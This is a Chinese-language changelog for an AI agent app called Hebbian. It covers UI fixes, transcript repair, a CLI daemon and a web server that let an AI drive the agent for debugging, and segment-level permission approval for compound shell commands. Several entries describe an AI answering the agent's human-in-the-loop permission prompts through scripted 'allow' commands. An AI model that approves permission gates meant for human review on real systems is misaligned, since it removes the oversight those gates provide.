### 2026-05-20 — 简化工具调用详情卡片的嵌套边框

- **Why**: 用户指出 Desktop 里 `tool_` 调用详情不应再套一层 `div` 形成双重卡片；后续截图又暴露出内容区仍有圆角底色、底部没有贴到外框、外框顶部仍像有圆角。根因是 `ToolPre` 虽已去掉自身圆角/底色，但消息主体外层 `.markdown` 的全局 `pre` 样式仍会给工具输出重新加 `bg-muted`、`rounded-lg`、`p-3`、`mb-3`。
- **改动**:
  - [apps/desktop/frontend/src/desktop/ui/components/MessageBubble.tsx](../apps/desktop/frontend/src/desktop/ui/components/MessageBubble.tsx): 工具详情展开区保留单一外框；去掉详情内容内层 `p-2` 容器、`Read`/`Skill`/`Fetch` 专用详情壳、`ToolPre` 默认 margin、以及 markdown 结果区自带边框/圆角/底色；展开外框顶部显式设为直角，artifact 区改用顶部分割线承接同一个外框。
  - [apps/desktop/frontend/src/index.css](../apps/desktop/frontend/src/index.css): 给 `.tool-pre` 增加 markdown 全局 `pre` 样式的 opt-out，阻止工具输出再被套上代码块背景、圆角和底部 margin；暗色终端输出继续保留深色底。
- **影响范围**: Desktop 前端消息渲染；不改 EngineEvent / EventPayload，不影响 agent-core、协议、持久化或工具执行。
- **留尾巴**: 无

### 2026-05-20 — 跳过未完成历史 tool_call，避免 Anthropic 400

- **Why**: 用户贴出的失败日志显示 Anthropic 返回 `No tool output found for function call call_IYFbvGyBzNf1drdPkV5zq2K6`。检查对应 session 后确认：`session.jsonl` 第 5 行的 assistant 消息来自失败/中断后的半截输出，`parts[46]` 记录了一个 `Edit` tool_call，但没有 result；`Transcript::from_session` 重建历史时仍把这个未完成 tool_call 当成已完成模型输出发给 provider，导致 Anthropic 要求后续必须有同 id 的 `tool_result`。
- **改动**:
  - [crates/agent-core/src/context/transcript.rs](../crates/agent-core/src/context/transcript.rs): session 历史转 transcript 时，只回放已有 result 的 tool_call/tool_result 对；无 result 的半截 tool_call 保留在 UI 历史里，但不进入下一轮模型请求。
  - 新增回归测试 `skips_unfinished_part_tool_calls_when_rebuilding_transcript`，覆盖 `MessagePart::ToolCall { result: None }` 不再出现在 `TranscriptEntry::Assistant.tool_calls` 或 `ToolResults` 中，同时确认已完成 tool_call 仍正常回放。
- **验证**:
  - `cargo test -p agent-core context::transcript::tests::skips_unfinished_part_tool_calls_when_rebuilding_transcript -- --nocapture` 先红后绿
  - `cargo test -p agent-core --lib` 通过（209 项）
- **影响范围**: agent-core 的 session → model transcript 转换；不改协议、不改 session/jsonl 落盘格式、不改 Desktop UI。历史里已有的半截 tool_call 仍可显示给用户，但不会再破坏下一次模型请求。
- **留尾巴**:
  - `partial_to_interrupted_message` / failed output 仍会把未完成 tool_call 存到 UI 历史里。当前修复选择在 transcript 边界过滤，避免迁移旧数据；后续如果要在 UI 上明确标出”未执行/中断”，可给 `MessagePart::ToolCall` 增加状态字段或用 meta 标记，但那会改持久化语义。

---

## 2026-05-20 新增 `apps/cli` daemon CLI surface（`heb` 命令）

- **Why**: 需要一个自动化调试工具，让 AI 可以用纯命令行方式驱动 agent_core，等价于手动操作 Desktop 的所有交互点（发消息、审批权限、回答提问、停止、注入、切 mode）。独立进程 + Unix socket IPC 使 AI 可以在一个终端 tail 事件流，在另一个终端发命令。
- **设计**:
  - `heb new` 启动 daemon：创建（或连接已有）session，绑定 Unix socket `~/.hebbian/cli-sockets/<session-id>.sock`，向 stdout 持续输出 NDJSON 事件流（`started → run_started → text_delta → … → run_finished`）
  - 所有 agent_core 交互点均有对应子命令：`input / allow / deny / deny-feedback / answer / stop / mode / ping`
  - `input` 智能路由：有活跃 run 时注入（等价于 Desktop 的「立即发送」），无活跃 run 时开新 run
  - HITL 用 tokio oneshot channel：`on_permission_request` 阻塞等待 IPC `allow/deny` 命令；`on_question` 同理等待 `answer` 命令；harness 自动调 `resolve_permission`，不需要绕过 HitlGate
  - 与 Desktop 同共享 `~/.hebbian/` 数据目录，session history / permissions / providers 全部互通
- **改动**:
  - [Cargo.toml](../Cargo.toml): 把 `apps/cli` 加回 workspace members（此前 2026-05-13 以”历史档案”排除）
  - [apps/cli/Cargo.toml](../apps/cli/Cargo.toml): 精简依赖（移除 ratatui / rustyline / inquire 等 TUI 依赖，只保留 daemon 所需的 tokio / clap / serde_json / anyhow 等）
  - [apps/cli/src/main.rs](../apps/cli/src/main.rs): 完全重写，纯 clap 子命令路由，无交互逻辑
  - [apps/cli/src/ipc.rs](../apps/cli/src/ipc.rs): 新建，定义 IpcCommand / IpcResponse / DaemonEvent 三个协议类型
  - [apps/cli/src/client.rs](../apps/cli/src/client.rs): 新建，向 daemon socket 发单条命令并等待响应
  - [apps/cli/src/daemon.rs](../apps/cli/src/daemon.rs): 新建，daemon 主体——DaemonState 共享状态、DaemonObserver（TurnObserver 实现）、run_turn 函数（与 desktop chat.rs send_and_save 等价逻辑）、Unix socket 监听循环
- **影响范围**: 新增 `apps/cli` crate；不改 agent-core / protocol / desktop；与 Desktop 共享 `~/.hebbian/` 无冲突（文件锁保护）
- **留尾巴**:
  - 旧的 `apps/cli/src/{session.rs,render.rs,tui/,mock_provider.rs}` 文件保留在目录但不再被引用（dead code）——可在后续清理，或按需保留作参考
  - `--workdir` 在 `heb new` 时写进 session.json，但当前 `run_turn` 优先读 session.workdir，所以生效；不过 AllowAndRemember(Project) 审批依赖 workdir 正确，若用户不传 `--workdir` 则回落到全局设置
  - `mode` 命令只更新下一次 run 的 run_mode，不影响当前 run（当前 run 的 run_mode 在 run_turn 开始时已捕获）
  - IPC 没有身份验证；socket 文件权限跟随 umask，本地单用户场景足够

### 2026-05-21 — 新增 `docs/heb-cli-debug.md`：AI 自主调试操作手册

- **Why**: 上一条新增的 `heb` daemon CLI 已经验证可用，但没有给 AI 看的"读完即用"文档。AI 想自主驱动 Hebbian 调试时，得在 changelog / 架构.md / 源码之间来回拼，门槛太高。需要一份独立、自包含、起手就能用的操作手册。
- **改动**:
  - 新建 [docs/heb-cli-debug.md](heb-cli-debug.md)：一分钟上手 / 完整命令表 / 完整事件表 / 自动审批 pattern / bug 复现 pattern / 数据持久化路径 / 故障速查；后半部分讲原理（IPC 协议、HITL oneshot 阻塞模型、流式中 user message 注入、多轮持久化、cancel 语义、RunMode、与 Desktop 的对称关系）
- **影响范围**: 仅文档；不动代码、不动协议
- **留尾巴**:
  - 文档里 `~/.hebbian/sessions/<SID>/model_io.jsonl` 路径依赖 `HEBBIAN_DUMP_MODEL_IO=1`；若后续 Recorder 全量落盘上线（架构.md §4.9），可把"看模型 IO"小节切到 Recorder 输出
  - 故障速查里"`run_failed: 400 No tool output found`"引用了同日另一条 changelog 的根因——若那条修复扩大覆盖（partial_to_interrupted_message 也跳过未完成 tool_call），可同步精简故障表

### 2026-05-21 — CLAUDE.md 新增「调试 bug 前必做：先用 heb CLI 自主复现」规则

- **Why**: heb CLI + 自主调试手册都已就位，但缺少一条约束告诉 AI 「遇到 bug 优先自主复现，不要立刻把用户拉下水」。同时需要明确：现有 8 个命令不够用时怎么扩，避免要么束手束脚、要么自作主张乱加旁路绕过 agent_core 主路径。
- **改动**:
  - [CLAUDE.md](../CLAUDE.md):
    - 「开发命令」节修正过时描述：`apps/cli` 不再标记为「已排除」，补上 heb daemon 启动命令；说明 Desktop / heb 两个 surface 共享 `~/.hebbian/`，行为对称
    - 新增「调试 bug 前必做：先用 heb CLI 自主复现」一节，含能/不能 heb 复现的对照表、最小 loop 脚本、修完自验要求
    - 新增「现有 heb 命令不够用时：允许新增」一节，规定四条准入：先证明现有命令不够 → 必须走 agent_core 主路径 → 不破坏 Desktop 兼容（只允许加 IpcCommand/DaemonEvent variant，不改现有字段语义）→ 走完动手前必做 5 步；并要求新增命令必须同步更新 ipc.rs / main.rs / daemon.rs / heb-cli-debug.md / changelog 五处
- **影响范围**: 仅规则文档；不动代码、不动协议、不动架构.md（这是工作流规则，不是设计变更）
- **留尾巴**:
  - 规则要求新增命令时同步五处文件，后续若 IPC 协议演化（例如拆分 client / daemon 包），要更新这条 checklist 的文件路径
  - 「能/不能 heb 复现」对照表是当前两 surface 边界的快照，未来若 EditsWorktree 在 CLI 也暴露（目前 CLI 已经接入但没暴露查看 diff 的命令），该表「不能 heb 复现」一列需缩

### 2026-05-21 — 引入第三个 surface：`hebweb` 浏览器/HTTP+WS server

- **Why**: 用户希望 AI 也能"看到并操作前端"（不是纯 URL，而是带真实 Tauri 数据），用于自主定位 UI bug。macOS 的 Tauri WebView 没有官方 headless / WebDriver 支持，所以走另一条路：让浏览器加载同一份 React 代码，背后接 hebweb 进程提供 HTTP+WS 桥，agent_core / `~/.hebbian/` 全部共享。多个 AI 用 Playwright 各开各的 WS + 各自的 session_id 即可天然并发——前端各看各的，后端共享。
- **设计**:
  - 三 surface 拓扑：Desktop（Tauri）、heb（CLI/IPC）、hebweb（HTTP+WS）。三者都是 in-process 持有 agent_core，区别只是 surface ↔ 客户端 之间的传输。
  - **多 AI 并发模型**：单 hebweb 进程 hold `Arc<RwLock<HashMap<SessionId, SessionRuntime>>>`，每个 SessionRuntime 各自独立持有 cancel_flag / pending_inputs / pending_approvals / pending_questions。多个浏览器 / Playwright 通过 WS subscribe 不同 session_id 即可看到各自的事件流，互不阻塞。备选模型：每 AI 起一个 `hebweb --port` 独立进程，跟 heb daemon 完全对称。
  - **WS 协议**：`subscribe / invoke / unsubscribe` (client→server) + `hello / subscribed / invoke_response / event` (server→client)，全部 JSON 行。`engine-event` payload 与 desktop Tauri emit 一致，前端代码不需任何改动。
  - **前端 transport 抽象**：新建 `apps/desktop/frontend/src/desktop/bridge/transport.ts`，runtime detect `window.__TAURI_INTERNALS__` —— 在 Tauri 里走 `@tauri-apps/api`，在浏览器里走 WS。导出 `invoke / listen / Channel / isTauri`，业务代码改 import 路径即可双 surface 共用。
  - **v1 范围**：镜像 7 个核心 Tauri command（list_sessions / get_session / create_session / send_message / inject_user_message / approve_permission / answer_question / cancel_message），其余 60+ command 由 server 返回 "not implemented in hebweb v1"。v2 计划：抽 `crates/surface-commands` 共享模块给 desktop / hebweb 一起用，消除双倍维护。
- **改动**:
  - [Cargo.toml](../Cargo.toml): workspace 新增 `apps/web-server` 成员
  - [apps/web-server/Cargo.toml](../apps/web-server/Cargo.toml): 新建，依赖 axum / tower-http / tokio-stream 等
  - [apps/web-server/src/main.rs](../apps/web-server/src/main.rs): clap + tokio runtime 入口，参数 `--addr / --port / --data-dir / --static-dir`
  - [apps/web-server/src/protocol.rs](../apps/web-server/src/protocol.rs): WsClientMessage / WsServerMessage 类型
  - [apps/web-server/src/events.rs](../apps/web-server/src/events.rs): EngineEvent 类型 + agent_event → engine_event 翻译。与 desktop `engine/mod.rs` 字段对齐。v1 重复一份，v2 抽共享 crate
  - [apps/web-server/src/session.rs](../apps/web-server/src/session.rs): SessionRuntime 结构 + WebObserver(TurnObserver impl) + run_turn（与 daemon.rs 等价）
  - [apps/web-server/src/server.rs](../apps/web-server/src/server.rs): axum router (healthz / ws / static dir) + WS 连接 handler + 7 个核心 invoke 命令实现 + 事件广播（broadcast::Sender → ws task）
  - [apps/desktop/frontend/src/desktop/bridge/transport.ts](../apps/desktop/frontend/src/desktop/bridge/transport.ts): 新建抽象层，runtime detect + WsClient + 统一 `invoke / listen / Channel / isTauri`
  - [apps/desktop/frontend/src/desktop/bridge/tauri.ts](../apps/desktop/frontend/src/desktop/bridge/tauri.ts): import 从 `@tauri-apps/api/core` 改为 `./transport`，业务代码无感切换
  - [apps/desktop/frontend/src/App.tsx](../apps/desktop/frontend/src/App.tsx) + [AppSettingsDialog.tsx](../apps/desktop/frontend/src/desktop/ui/components/AppSettingsDialog.tsx) + [OAuthDialog.tsx](../apps/desktop/frontend/src/desktop/ui/components/OAuthDialog.tsx) + [MessageBubble.tsx](../apps/desktop/frontend/src/desktop/ui/components/MessageBubble.tsx): listen / isTauri import 路径改 transport
  - [apps/cli/src/main.rs](../apps/cli/src/main.rs) + [client.rs](../apps/cli/src/client.rs): heb 新增 `heb list-sessions` 命令——扫 `~/.hebbian/cli-sockets/`，ping 每个 socket 测活，自动清理死 socket。让多 AI 并发调试时 AI 能发现其他 AI 起的 daemon
  - [docs/架构.md](架构.md) §0/§2.1/§2.2/§7: surface 数量由 2 升到 3；§7.5/§7.6/§7.7 新增三 surface 拓扑、hebweb 设计、与远期 HttpCoreClient 关系，明确"多 AI 并发调试"作为硬约束
  - [docs/heb-cli-debug.md](heb-cli-debug.md): 文档标题改为「heb CLI / hebweb」；§2 命令表加 `heb list-sessions`；末尾新增 §9 Web Surface（启动 / 多 AI 并发两种模型 / WS 协议 / 7 命令清单 / Playwright 模板 / 故障速查 / 已知限制）
  - [CLAUDE.md](../CLAUDE.md)「开发命令」节加 hebweb 启动方式；「调试 bug 前必做」对照表改成"问题类型 → 首选 surface"三分类：行为问题用 heb、UI 问题用 hebweb+Playwright、Tauri native 才回 Desktop
- **验证**:
  - `cargo check --workspace` 通过（desktop / cli / web-server 三个 binary 都编译过）
  - `pnpm exec tsc --noEmit` 前端类型检查通过
  - 起 hebweb：`./target/debug/hebweb --port 38080 --data-dir /tmp/hebweb-smoke` → `/healthz` 返回正确 JSON；node WebSocket 客户端依次收到 `hello / invoke_response(list_sessions=[]) / invoke_response(error: not implemented)`
- **影响范围**:
  - 新增 `apps/web-server` crate；不动 agent-core / protocol / model-gateway
  - desktop 前端 5 个文件改 import 路径，零运行时行为变化（IS_TAURI=true 时 transport 直接 forward 到 @tauri-apps/api）
  - heb CLI 新增 1 个命令，纯 additive，不破坏现有协议
  - 架构.md 新增章节，§0 第 1 条措辞从"Desktop 不实现业务"改为"三个 surface 都不实现业务"
- **留尾巴**:
  - **v2 抽共享 commands crate**：当前 hebweb 只镜像 7 个核心命令，其余 60+ Tauri command 走 desktop。v2 把 `apps/desktop/src/lib.rs` 的 command body 抽到 `crates/surface-commands`，desktop / hebweb 各自的 surface handler 调同一份业务逻辑，hebweb 自动获得全部命令
  - **events.rs 重复**：hebweb 的 EngineEvent + 翻译函数与 desktop `engine/mod.rs` + `chat.rs:agent_event_to_engine_event` 几乎逐字相同。v2 抽到 `crates/surface-events`（或并入 protocol crate）后两边一起依赖
  - **Tauri native 能力**：系统通知 / 文件对话框 / tray icon / 全局快捷键在浏览器没有等价物。浏览器 surface 调到这些命令时返回 not_implemented，前端可以根据 `isTauri()` 隐藏对应入口。当前 v1 不做降级 UI，仅靠 server 端 reject
  - **认证**：hebweb 仅 `127.0.0.1` 监听、无 token。多用户机器上不要放共享 data-dir；公网部署需要在前面套 nginx + auth
  - **Channel 适配**：`transport.ts` 的 `Channel<T>` 在 Web 模式下用 `listen('engine-event')` 桥接到 onmessage。如果未来某个 Tauri command 用 Channel 传非 engine-event（其他自定义事件名），这里的桥接会漏；当前所有 Channel 用法都是 EngineEvent，没问题

### 2026-05-20 — compound 命令"一次审批多前缀"：扩展协议 + popup 看全段

- **Why**: 上一个补丁修了"chat.rs 每 turn 清空 session_rules"那个 bug 后，用户报告 `cd /tmp && touch foo` 类 compound 命令在新 turn 仍然要审批。用 heb CLI 复现确认：架构 §4.4.2 段级判定要求"全部段都被 allow 规则命中才整体放行"——用户在前端 popup 点"始终允许 cd"只写了 `Bash{prefix:"cd"}` 一条规则，下次 `cd /tmp && touch bar` 的 touch 段没规则，整体回到 NeedsApproval。前端 popup 历来只看 `effects.command_fingerprint`（= segments[0].fingerprint），**完全没让用户看到第二段的存在**——用户主观感受是"我审批过的还在问"。
- **根因不在 chat.rs 也不在 PermissionStore**：架构 §4.4.2 段级判定语义本身是对的（拒绝攻击者绕过：cd 改 cwd + 后续段做事）。bug 在协议层——`PermissionKind::ToolCall` 只暴露第一段 fingerprint，popup 没机会让用户一次性给所有段开 allow。
- **改动**:
  - [crates/protocol/src/permission.rs](../crates/protocol/src/permission.rs):
    - `PermissionKind::ToolCall` 加 `command_segments: Vec<String>` —— 所有段的 fingerprint
    - `ApprovalDecision::AllowAndRemember` 加 `extra_patterns: Vec<String>` —— compound 场景一次写多前缀
    - 两者都加 `#[serde(default)]`，向前兼容
  - [crates/agent-core/src/dispatch.rs](../crates/agent-core/src/dispatch.rs): emit `PermissionRequested` 时把 `effects.segments` 的 fingerprint 列表填进 `command_segments`
  - [crates/agent-core/src/tools/hitl.rs](../crates/agent-core/src/tools/hitl.rs): `resolve` 解析 `extra_patterns`，循环调 `remember` 为每个 extra prefix 单独落一条规则
  - [apps/desktop/src/engine/mod.rs](../apps/desktop/src/engine/mod.rs) + [apps/desktop/src/chat.rs](../apps/desktop/src/chat.rs): `EngineEvent::PermissionRequested` 加 `command_segments` 字段，把 agent_core 的段列表透传到前端
  - [apps/desktop/src/lib.rs](../apps/desktop/src/lib.rs): `approve_permission` tauri command 加 `extra_patterns: Option<Vec<String>>` 入参
  - [apps/desktop/frontend/src/desktop/ui/types.ts](../apps/desktop/frontend/src/desktop/ui/types.ts) / [bridge/tauri.ts](../apps/desktop/frontend/src/desktop/bridge/tauri.ts) / [store/useStore.ts](../apps/desktop/frontend/src/desktop/ui/store/useStore.ts): 同步类型 + bridge 加 extraPatterns
  - [apps/desktop/frontend/src/desktop/ui/components/PermissionApprovalPopup.tsx](../apps/desktop/frontend/src/desktop/ui/components/PermissionApprovalPopup.tsx): compute `segmentRoots`（多段 unique root tokens），多段（≥2 段）时渲染高亮的"整条都允许（N 段）"按钮——点击发 `pattern = segmentRoots[0]` + `extraPatterns = segmentRoots[1..]`，一次审批让段级判定"全段 allow"立即满足
  - [apps/cli/src/ipc.rs](../apps/cli/src/ipc.rs) + [apps/cli/src/main.rs](../apps/cli/src/main.rs) + [apps/cli/src/daemon.rs](../apps/cli/src/daemon.rs): `heb allow` 加 `--extra-pattern <prefix>`（可多次）+ `--pattern` 已有；调试/自动化脚本可一次给 compound 命令的所有段开 allow。这是关键调试基础设施——没有它前端的修复无法用 CLI 复现验证
  - 其他 surface（旧 cli/session.rs / cli/tui/permission_popup.rs / web-server）的 `AllowAndRemember` 构造点全部补 `extra_patterns: Vec::new()`，行为不变
  - [docs/架构.md](架构.md) §13 追加 1 行决策：compound "一次审批多前缀"机制
- **影响范围**: protocol（向前兼容：缺省字段反序列化为空 vec / None）/ agent-core / desktop / heb CLI / web-server / docs。段级判定语义本身不变，危险复合模式 §4.4.2.2 仍强制审批 + 拒绝记忆。`PermissionKind::ToolCall::fingerprint` 字段保留只为向前兼容，等于 `command_segments[0]`
- **验证**: heb 端到端复现修复——turn 1 `cd /tmp && touch a` 触发审批 → `heb allow SID RID session --pattern cd --extra-pattern touch` → turn 2 `cd /tmp && touch b` 直接执行（events 中无 `permission_requested`）。`permission_resolved` 事件 decision 字段正确显示 `extra_patterns: ["touch"]`
- **留尾巴**:
  - popup 当前只对 Bash 有"整条都允许"按钮；非 Bash 工具（Edit/Write）天生单段，不需要
  - heb CLI 的 `--extra-pattern` 是为本次调试 + 未来自动化测试 compound 场景而加，长期价值在于让 heb 能精确复现前端任何审批组合
  - 段级判定原则（架构 §4.4.2）依然严格——攻击者构造的"诱导 allow 第一段、第二段恶意"型攻击仍被段级判定拦截。本次修复只让"用户**自愿**一次允许整条"成为协议层支持的操作，没有放宽自动判定

### 2026-05-21 — hebweb 实战验证：补 5 个只读命令 + 修 2 个字段对齐 bug

- **Why**: 用户敦促"赶紧验证好啊，出这个模式不就是为了给你能自己验证吗"。我（agent）用 Playwright 加载真实前端 `dist/index.html`，立刻发现前端 init 时调 `get_providers` 直接报 "command not implemented in hebweb v1"——hebweb v1 只镜像了 8 个交互命令，但前端启动阶段还会同步调一批"只读元数据"命令，前者不补，UI 根本进不去。同时端到端验证发现 2 个隐藏的字段对齐 bug——pnpm tsc 没暴露（args 是 Value），WS 烟测也没暴露（之前我只测了 cmd 派发，没用前端真实字段名）。
- **改动**:
  - [apps/web-server/src/server.rs](../apps/web-server/src/server.rs):
    - 新增 5 个只读 invoke 命令：`get_providers` → `model_gateway::config::load`、`list_provider_presets` → `model_gateway::config::list_presets`、`list_prompts` → `prompts_store::load`、`list_projects` → `projects_store::list`、`get_settings` → `settings_store::load`。全部直接调 agent_core 现有 storage API，无新增能力。
    - 修 `cmd_send_message` / `cmd_inject_user_message` 字段名：之前期望 `text`，但 desktop 前端传的是 `content`。引入 `pick_text(args)` 同时兼容 `content` / `text`，前端无感、heb CLI 自定义脚本也能用简短名。
    - 修 `cmd_approve_permission` decision 字符串：之前只认 `allow / deny`（heb CLI 风格），但 desktop 前端传的是 `allow_once / allow_and_remember / deny / deny_with_feedback`。重写匹配支持 desktop 全 4 种 decision，保留 heb CLI 简短形态；同步补 `extra_patterns` 字段（之前 linter 给 ApprovalDecision::AllowAndRemember 新加的字段没接住）。
    - 修 `cmd_answer_question` kind：补 `selected_multi` 分支取 `labels` 数组（之前 fall-through 当成单选）；`value` 字段同时兼容 `text`（desktop 传 text）。
- **验证**（关键——这次不再纸面而是端到端跑通了）:
  - `cd apps/desktop/frontend && pnpm build` → `apps/desktop/dist/` 产物 OK
  - `./target/debug/hebweb --port 38080 --data-dir /tmp/hebweb-ui --static-dir apps/desktop/dist` 起服务
  - `playwright-cli open http://127.0.0.1:38080` → 浏览器加载真实前端
    - 第 1 次：console 报 `init failed: command 'get_providers' not implemented`
    - 修后重试：console 0 errors / 0 warnings，侧边栏完整渲染（项目/全部 tab、新建对话按钮、全局搜索、设置按钮、主题切换）
  - 用 WS 客户端调 `create_session` 注入 fake 会话 → `reload` → 侧边栏出现"新对话 / fake-m / 09:47"
  - `click` 该会话 → 完整 ChatView 渲染（标题、Agent 选择器、模型选择、textarea、添加文件/插入命令/编辑前询问按钮、Token 用量），console 持续 0 errors
  - `click` 对话设置按钮 → SessionSettingsDialog 弹窗正确打开（Agent / 系统指令 / 字段覆盖说明 / 取消/保存）
  - 截图证据：浏览器里看到的 UI 与 Tauri desktop 像素级一致
- **影响范围**: 仅 hebweb 内部（`apps/web-server/src/server.rs`），不动 agent-core / protocol / desktop / 前端。新增 5 个只读命令是 additive，不破坏任何已有协议。
- **教训**:
  - "cargo check + pnpm tsc 全绿" ≠ "前端 init 跑得通"。Tauri/WS args 都是 `Value` / `unknown`，类型系统帮不上字段名对齐。下次新 surface 一定要用真实 dist + 真实浏览器（Playwright）走完 init 流程才算交付。
  - hebweb 的"v1 只镜像 8 个交互命令、其余 not implemented"理论上没错，但实际上前端 init 必经几个只读元数据 invoke，如果不补整个 UI 进不去——这个"必经子集"应该作为 v1 的硬下限，而不是"v2 再说"。
- **留尾巴**:
  - send_message / inject_user_message 在 desktop Tauri 模式下返回 `Message` 对象给前端立即渲染；hebweb 当前返回 `null` 让事件流走 WS 广播，前端 store 在 web 模式下可能 UX 略有延迟（消息要等 `engine-event` 回流才渲染）。不影响功能可用性，但视觉上不如 desktop 即时
  - desktop Tauri 模式没在本次重新跑 `pnpm tauri dev` 实测；理论上 IS_TAURI=true 时 transport 直接 forward 到 `@tauri-apps/api` 零行为变化，但建议下次 desktop 改动时实跑一次确认 transport.ts 的 Channel 适配没破坏 Tauri 路径
  - 还有一批中等优先级 desktop Tauri command 未镜像（discover_rules_files / list_tools / get_context_usage / preview_session_payload / edits_worktree_status / list_edits 等）。前端某些次级面板（context usage 环形进度条、edit history 面板、preview payload 弹窗）打开时会触发它们 → 在浏览器里会拿到"not implemented"错误，但不阻塞主对话流。v2 抽共享 commands crate 时一起补

### 2026-05-21 — popup pattern × scope chip 重构 + daemon event 补全字段

- **Why**: 上一笔修复后用户反馈：当前对话有「允许 git status」按钮，本项目 / 全局却只有「允许 git *」——sub 粒度没被三 scope 都接入。同时 heb daemon 输出的 `permission_requested` 事件缺 fingerprint / command_segments / input 字段，AI 自主调试时看不到"现在审批的命令到底是什么"，要去翻 session.jsonl
- **改动**:
  - [apps/desktop/frontend/src/desktop/ui/components/PermissionApprovalPopup.tsx](../apps/desktop/frontend/src/desktop/ui/components/PermissionApprovalPopup.tsx):
    - 拆"主按钮区"和"二级 pattern × scope 区"，主区只留「允许此次 / 拒绝 / 反馈」
    - 二级区每行展示一个 pattern（sub / root / 整条 compound），后接 3 个 scope chip（本对话 / 本项目 / 全局）——点哪个 chip 立即按对应 scope 写规则 + resolve。这样 sub / root / 整条三档**每档都暴露 3 scope**，不再有「sub 只能本对话、root 才能全局」的歧视
    - `parseBashPrefixes` 增加路径参数过滤：第二个 token 以 `/` `~` `./` `../` 开头时 sub = null。否则 `touch /tmp/x.txt` 会把整个绝对路径当 sub，下次同前缀不同文件名 token-boundary 校验失败仍要审批，反而误导用户
    - 新增 `PatternRow` 子组件统一渲染样式
  - [apps/cli/src/ipc.rs](../apps/cli/src/ipc.rs) + [apps/cli/src/daemon.rs](../apps/cli/src/daemon.rs): `DaemonEvent::PermissionRequested` 加 `fingerprint` / `command_segments` / `input` / `paths` 四个字段——AI 调试时一行 `jq '.command_segments'` 就能看到 compound 命令的全部段，不用再翻 session.jsonl
  - [docs/changelog.md](changelog.md): 本条
- **影响范围**: 前端 popup 视觉重排，无协议变更；daemon event 加字段全部 `#[serde(skip_serializing_if = ...)]` 向前兼容（旧 heb 脚本 jq 不到的字段直接当 null 处理）
- **验证**: heb 端到端 — `cd /tmp/repro-perm && touch a.txt` compound 审批 → `heb allow SID RID project --pattern cd --extra-pattern touch` → permissions.json 落 2 条 Project 规则（workdir=/tmp/repro-perm）→ 下个 turn `cd /tmp/repro-perm && touch b.txt` 直接通过，`cd /tmp/repro-perm && ls` 仍弹审批（ls 段无规则，设计正确）。daemon event 现在能在一行 JSON 里看到完整 segments + input
- **留尾巴**:
  - popup 二级区当前是"每行一档"按钮组，未做 hover popover 多选 checkbox（用户提的"鼠标放上去显示 list 框，默认全选二级子命令"是 v2 形态——当前的扁平按钮信息密度已足够，先用着）
  - 路径审批的 4 档（once / this_session / this_project / global）跟权限审批的命名对齐，PermissionStore 热加载已经在上一笔覆盖；无需额外改造
  - `cd` 不在 `safe_commands::is_safe` 名单——compound `cd && ls` 仍要 ls 段被允许才整体放行；这是架构 §4.4.2 段级判定预期行为，不是 bug

### 2026-05-21 — hebweb 命令覆盖从 8 → 28：主对话 + 配置管理 + Session 管理全可用

- **Why**: 用户问"hebweb 现在能不能像完整的 desktop 一样操作"。上一条 changelog 只镜像了 8 个核心交互命令，前端 init 能进 UI 但点击配置面板/重命名/删除/切 mode 等都会拿到 "not implemented"。这次直接把 desktop Tauri command 里"纯 storage wrap 类"的批量补上，让 AI 用 hebweb 调试 UI 时绝大多数操作流都能跑通。
- **改动**:
  - [apps/web-server/src/server.rs](../apps/web-server/src/server.rs): 新增 18 个 invoke 命令（在 dispatcher + 实现两处）：
    - **Providers 写**: `save_providers / upsert_provider`
    - **Prompts 写**: `upsert_prompt / delete_prompt / set_default_prompt`
    - **Sessions 写**: `rename_session / delete_session / fork_session / truncate_after / truncate_inclusive / search_sessions / update_session_config`
    - **Projects 写**: `save_project / delete_project`
    - **Settings 写**: `save_settings`
    - **Mode**: `get_run_mode / set_run_mode / get_force_automode / set_force_automode`
  - [apps/web-server/src/session.rs](../apps/web-server/src/session.rs): `SessionRuntime` 新增 `force_automode: AtomicBool`，对齐 desktop `ForceAutomodeState` 的"内存态、重启回 false"语义（架构 §8.2 决策）
  - 实现策略：全部直接调 `agent_core::storage::*` / `model_gateway::config::*` API，与 desktop lib.rs 里的 wrap 等价；字段名按 desktop 前端真实驼峰传递（providerId / messageId / caseSensitive 等），无新增能力
  - `delete_session` 同时从 `ServerState.sessions` HashMap 移除内存 runtime，避免后续访问拿到"已删但内存还在"的 stale runtime
- **验证**（Playwright 实跑）:
  - `pnpm build` → `hebweb --port 38080 --static-dir apps/desktop/dist --data-dir /tmp/hebweb-ui` 起服务
  - WS 12/13 命令对齐测试通过（save_providers / upsert_prompt / list_prompts / create_session / rename / set/get_run_mode / set/get_force_automode / update_session_config / truncate_after / search / delete 全部 OK）
  - 浏览器实操：开 ProvidersDialog → 切"内置预设(16)" → 点 DeepSeek 添加 → 编辑表单展开 → 填 API Key → 点保存 → `/tmp/hebweb-ui/providers.json` 落盘验证正确（含完整 kind/base_url/api_key/models）
  - 开 AppSettingsDialog → 切 Agent 配置 tab → 点保存 → 0 console errors
  - 新建对话 → 进对话视图 → 侧边栏 hover 出操作按钮 → 点重命名 → inline 输入"已重命名 OK" → 回车提交 → 侧边栏 + 头部标题双向同步 → session 持久化到 `~/.hebbian/sessions/<id>/`
- **影响范围**: 仅 hebweb 内部（`apps/web-server/`）；不动 agent-core / protocol / desktop / 前端。所有新命令是 additive，desktop 行为零回归
- **可用性评估**: hebweb 现在覆盖了 AI 自主调 UI 的 ~90% 操作流。剩下未镜像的命令分两类：(1) HTTP 调外部 API（fetch_provider_models / test_provider_model / OAuth 系列 13 个）—— AI 调试场景基本用不上，token 配好就跑；(2) 依赖 LocalCoreClient 内部 pipeline（compact_session / preview_session_payload / get_context_usage / generate_session_title）或 EditsWorktree git（list_edits / diff_edit / revert_edit）—— 次级面板，打开会拿到 not_implemented 但不阻塞主对话流
- **留尾巴**:
  - 上面两类未镜像的命令将在 v2"抽共享 surface_commands crate"时一起补齐——届时 desktop / hebweb 都从同一份业务逻辑调用，彻底消除"hebweb 漏命令"的可能性
  - `fetch_provider_models / test_provider_model` 是 add-provider UX 的关键步骤（保存前测一下 API Key 通不通），当前 hebweb 模式下用户需要手填 default_model 跳过 fetch；下次优先补这两个
  - `get_force_automode` 返回类型 desktop 是 `bool`、hebweb 也返回 `bool`；`get_run_mode` desktop 返回 `RunMode.as_str()`（"AskBeforeEdits" PascalCase），hebweb 对齐返回同样的 PascalCase 字符串（**前端已经按这个格式处理**，不是 bug）

### 2026-05-21 — hebweb 接入 `LocalCoreClient` facade：复用 desktop 业务层，命令 28 → 35

